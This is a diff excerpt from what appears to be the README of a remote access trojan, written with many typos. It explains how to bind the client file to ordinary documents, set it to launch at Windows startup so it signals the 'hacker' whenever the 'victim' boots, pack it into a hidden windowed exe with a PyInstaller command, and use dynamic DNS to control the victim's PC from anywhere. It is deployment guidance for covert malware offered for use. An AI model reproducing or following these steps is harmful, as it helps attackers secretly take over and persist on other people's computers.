@@ -17,9 +17,9 @@ than it's automaticaly active and you can also binde with any file like word fil
 or one time client.py/client.exe file active you haver to only set as a windows stater file means whenever victim start PC so automaticaly our file is run and send the simel to hacker
 
 any if you want to convert your .py file into .exe fier this command
-==================================================================
+"""
 pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile --windowed
-=================================================================
+"""
 
 or it is only work in same network if you want to used out side of network you have to used "NOip" means you have to conver your dynamic ip as static ip menas client file find your ip and redirect as your ip and you can access client PC any where any time
 
